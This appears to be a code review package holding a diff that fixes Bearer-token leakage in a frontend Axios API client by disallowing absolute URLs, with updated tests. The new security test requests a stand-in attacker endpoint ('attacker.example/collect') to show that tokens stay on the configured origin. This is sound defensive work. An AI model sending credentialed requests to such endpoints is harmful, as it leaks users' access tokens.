@@ -1,0 +1,116 @@
+# Review package: f47b7ed2bf14fa6cf6064ab762b961febc5b1a62..HEAD
+
+## Commits
+18b6add 🔒 fix: keep API tokens on configured origin
+
+## Files changed
+ frontend/src/lib/api-client.security.test.ts | 41 ++++++++++++++++++++++++++++
+ frontend/src/lib/api-client.test.ts          |  5 +++-
+ frontend/src/lib/api-client.ts               |  2 +-
+ 3 files changed, 46 insertions(+), 2 deletions(-)
+
+## Diff
+diff --git a/frontend/src/lib/api-client.security.test.ts b/frontend/src/lib/api-client.security.test.ts
+new file mode 100644
+index 0000000..0daec8e
+--- /dev/null
++++ b/frontend/src/lib/api-client.security.test.ts
+@@ -0,0 +1,41 @@
++import axios, { AxiosHeaders, type AxiosAdapter } from 'axios'
++import { afterEach, expect, it, vi } from 'vitest'
++
++import { createApiClient } from './api-client'
++
++const originalAdapter = axios.defaults.adapter
++
++afterEach(() => {
++  axios.defaults.adapter = originalAdapter
++})
++
++it('keeps Bearer tokens on the configured API origin for absolute request paths', async () => {
++  const observedRequests: Array<{ authorization: string | undefined; url: string }> = []
++  const adapter: AxiosAdapter = vi.fn(async (config) => {
++    observedRequests.push({
++      authorization: config.headers.get('Authorization')?.toString(),
++      url: axios.getUri(config),
++    })
++
++    return {
++      config,
++      data: { id: 'auth0|user-a' },
++      headers: new AxiosHeaders(),
++      status: 200,
++      statusText: 'OK',
++    }
++  })
++  axios.defaults.adapter = adapter
++
++  const client = createApiClient(
++    vi.fn().mockResolvedValue('access-token'),
++    'https://api.example.test',
++  )
++
++  await client.get('https://attacker.example/collect')
++
++  expect(observedRequests).toEqual([{
++    authorization: 'Bearer access-token',
++    url: 'https://api.example.test/https://attacker.example/collect',
++  }])
++})
+diff --git a/frontend/src/lib/api-client.test.ts b/frontend/src/lib/api-client.test.ts
+index d9397c0..6926ace 100644
+--- a/frontend/src/lib/api-client.test.ts
++++ b/frontend/src/lib/api-client.test.ts
+@@ -61,21 +61,24 @@ afterEach(() => {
+   axiosState.responseRejection = undefined
+ })
+ 
+ it('creates an Axios instance for the configured API and attaches the Auth0 access token', async () => {
+   const getAccessTokenSilently = vi.fn().mockResolvedValue('access-token')
+   const client = createApiClient(getAccessTokenSilently, 'http://localhost:3001')
+   axiosState.get.mockResolvedValue({ data: { id: 'auth0|user-a' } })
+ 
+   await client.get<{ id: string }>('/me')
+ 
+-  expect(axios.create).toHaveBeenCalledWith({ baseURL: 'http://localhost:3001' })
++  expect(axios.create).toHaveBeenCalledWith({
++    allowAbsoluteUrls: false,
++    baseURL: 'http://localhost:3001',
++  })
+   const config = await applyRequestInterceptor({ headers: new AxiosHeaders() })
+   expect(config.headers.get('Authorization')).toBe('Bearer access-token')
+ })
+ 
+ it('returns typed response data for GET and POST and resolves DELETE with no content', async () => {
+   const client = createApiClient(vi.fn().mockResolvedValue('access-token'), 'http://localhost:3001')
+   axiosState.get.mockResolvedValue({ data: { id: 'auth0|user-a' } })
+   axiosState.post.mockResolvedValue({ data: { id: 'collection-1', name: 'Work' } })
+   axiosState.delete.mockResolvedValue({})
+ 
+diff --git a/frontend/src/lib/api-client.ts b/frontend/src/lib/api-client.ts
+index d3ad648..49a1a19 100644
+--- a/frontend/src/lib/api-client.ts
++++ b/frontend/src/lib/api-client.ts
+@@ -9,21 +9,21 @@ export class ApiError extends Error {
+     this.status = status
+   }
+ }
+ 
+ type GetAccessToken = () => Promise<string>
+ 
+ export function createApiClient(
+   getAccessTokenSilently: GetAccessToken,
+   baseUrl = import.meta.env.VITE_API_BASE_URL,
+ ) {
+-  const http = axios.create({ baseURL: baseUrl })
++  const http = axios.create({ allowAbsoluteUrls: false, baseURL: baseUrl })
+ 
+   http.interceptors.request.use(async (config) => {
+     const token = await getAccessTokenSilently()
+     config.headers.set('Authorization', `Bearer ${token}`)
+     return config
+   })
+ 
+   http.interceptors.response.use(
+     (response) => response,
+     (cause: unknown) => {
